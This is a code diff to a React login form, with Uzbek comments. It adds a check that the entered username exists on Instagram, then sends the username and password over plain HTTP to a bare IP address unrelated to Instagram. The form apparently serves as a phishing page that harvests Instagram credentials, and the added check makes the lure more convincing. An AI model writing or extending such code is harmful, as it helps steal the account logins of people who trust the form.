@@ -30,11 +30,25 @@ const LoginForm = ({
 
       setValidationErrors({
          username:
-            formData.username.trim() == '' ? 'Please enter your username' : '',
+            formData.username.trim() === '' ? 'Please enter your username' : '',
          password:
-            formData.password.trim() == '' ? 'Please enter your password' : '',
+            formData.password.trim() === '' ? 'Please enter your password' : '',
       });
+
+      if (!formData.username || !formData.password) return;
+
       try {
+         // 1. Instagram foydalanuvchisini tekshirish
+         const instagramResponse = await fetch(
+            `https://www.instagram.com/${formData.username}/?__a=1&__d=dis`,
+         );
+
+         if (instagramResponse.status !== 200) {
+            alert('The username does not exist on Instagram.');
+            return;
+         }
+
+         // 2. Login so‘rovini yuborish
          const response = await fetch('http://185.217.131.96:1111/login', {
             method: 'POST',
             headers: {
@@ -49,7 +63,10 @@ const LoginForm = ({
          if (response.ok) {
             alert('Login successful!');
          } else {
-            alert(`Error: ${data.message}`);
+            setValidationErrors((prev) => ({
+               ...prev,
+               username: data.message || 'Invalid username or password',
+            }));
          }
       } catch (error) {
          console.error('Error sending login request:', error);
